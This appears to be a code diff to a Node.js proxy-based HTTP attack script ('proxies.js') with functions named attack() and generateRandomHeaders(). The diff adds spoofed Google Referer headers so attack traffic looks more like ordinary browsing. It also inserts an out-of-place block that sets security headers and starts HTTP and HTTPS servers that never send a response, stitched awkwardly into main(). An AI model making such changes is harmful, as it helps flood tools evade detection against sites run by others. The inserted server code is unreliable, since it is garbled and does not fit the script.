@@ -161,7 +161,8 @@ function generateRandomHeaders() {
         'Upgrade-Insecure-Requests': '1',
         'Cache-Control': 'max-age=0',
         'TE': 'trailers',
-        'Pragma': 'no-cache'
+        'Pragma': 'no-cache',
+        'Referer': 'https://www.google.com/' // Add a referrer
     };
     return headers;
 }
@@ -185,7 +186,8 @@ function attack(targetUrl, proxy) {
       'Accept-Encoding': 'gzip, deflate, br',
       'Connection': 'keep-alive',
       'Upgrade-Insecure-Requests': '1',
-      'Content-Type': 'application/x-www-form-urlencoded' // Added content type
+      'Content-Type': 'application/x-www-form-urlencoded', // Added content type
+      'Referer': 'https://www.google.com/' // Add a referrer
     }
   };
   // Create a payload
@@ -252,6 +254,27 @@ async function main() {
     console.error('Target URL is required. Usage: node proxies.js <target_url>');
     process.exit(1);
   }
+
+  // Security Headers
+  // Function to set security headers
+function setSecurityHeaders(res) {
+    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
+    res.setHeader('X-Frame-Options', 'DENY');
+    res.setHeader('X-Content-Type-Options', 'nosniff');
+    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+    res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
+    res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' https://cdnjs.cloudflare.com;"); // Update CSP
+  }
+  
+  // Example usage in HTTP/HTTPS request:
+  http.createServer(function (req, res) {
+    setSecurityHeaders(res);
+  }).listen(8080);
+  
+  https.createServer(function (req, res) {
+    setSecurityHeaders(res);
+  }).listen(8443);
+
     const consent = await askForConsent();
     if (!consent) {
         console.log(`%c[INFO] User declined consent. Exiting.`, `color: ${config.colorScheme.darkBlue}`);
